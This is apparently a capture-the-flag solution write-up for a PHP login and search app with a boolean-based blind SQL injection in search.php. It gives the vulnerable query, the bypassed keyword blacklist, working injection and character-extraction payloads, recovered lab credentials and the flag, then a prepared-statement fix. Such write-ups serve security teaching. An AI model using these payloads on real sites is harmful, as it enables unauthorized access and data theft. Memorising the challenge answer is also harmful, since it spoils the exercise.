# Final Solution

## Overview

The application contains a Boolean-Based Blind SQL Injection vulnerability in the search functionality (`search.php`).  

Although the login mechanism correctly uses prepared statements, the search functionality directly concatenates user input into SQL queries and attempts to secure the input using blacklist filtering.

Two different approaches were identified during analysis:

1. Exploitation through SQL Injection payloads
2. Static source code analysis to recover credentials directly from application files

The second approach was ultimately used because it was more reliable and efficient.

## Root Cause

The vulnerability exists because user-controlled input is inserted directly into SQL queries:

```php
$sql = "SELECT * from users where username=\"".filter_chars($_REQUEST["username"])."\"";
```

The application attempts to mitigate attacks by filtering selected SQL keywords:

```text
and
null
where
limit
like
substring
substr
```

However, blacklist filtering does not prevent alternative SQL syntax from being used.

## Exploit Method 1 — Boolean-Based Blind SQL Injection

### Step 1: Identify the vulnerable parameter

The vulnerable parameter is:

```text
username
```

### Step 2: Inject a Boolean payload

Payload:

```text
admin"||"1"="1"%23
```

Resulting SQL query:

```sql
SELECT *
FROM users
WHERE username="admin" || "1"="1"
```

Because:

```sql
"1"="1"
```

always evaluates to true, the database returns results independently of the original condition.

This confirms the SQL injection vulnerability.

### Step 3: Blind credential extraction (theoretical)

Credentials could theoretically be extracted using payloads such as:

```text
admin"&&LEFT(password,1)="T"%23
```

or:

```text
admin"&&ASCII(MID(password,1,1))=84%23
```

However, manually extracting credentials character-by-character was inefficient and was not used for the final solution.

---

## Exploit Method 2 — Source Code Analysis (Used Solution)

Inspection of the database initialization files revealed predefined credentials:

```text
Username: admin
Password: ThisIsBestPassword
```

The credentials were directly reused in the login page:

```text
username: admin
password: ThisIsBestPassword
```

Successful authentication exposed the flag:

```text
FLAG{c1aa7b7022dd4a9c8e78927cfd19d88d18a26cd73d4cca0d153f6a2e8d5170b5}
```

## Technical Details

### Vulnerable file

```text
search.php
```

### Vulnerable parameter

```text
username
```

### Working SQL Injection payload

```text
admin"||"1"="1"%23
```

### Credentials recovered

```text
admin : ThisIsBestPassword
```

## Impact

An attacker could:

- Manipulate SQL queries
- Enumerate database content
- Extract sensitive information
- Gain unauthorized access
- Authenticate as privileged users

## Mitigation

The issue can be fixed by:

- Using prepared statements consistently
- Removing blacklist filtering approaches
- Validating user input correctly
- Applying parameterized database queries everywhere

Example:

```php
$stmt = $conn->prepare("SELECT * FROM users WHERE username=?");
$stmt->bind_param("s",$username);
```

## Key Insight

The challenge demonstrates that blacklist-based protection creates a false sense of security.

Even when specific SQL keywords are blocked, attackers can frequently bypass restrictions using alternative syntax.

Prepared statements provide significantly stronger protection than keyword filtering.

## Relation to Business Logic

This issue is not primarily a business logic flaw.

The vulnerability originates from insecure query construction and insufficient input handling rather than from incorrect business process implementation.
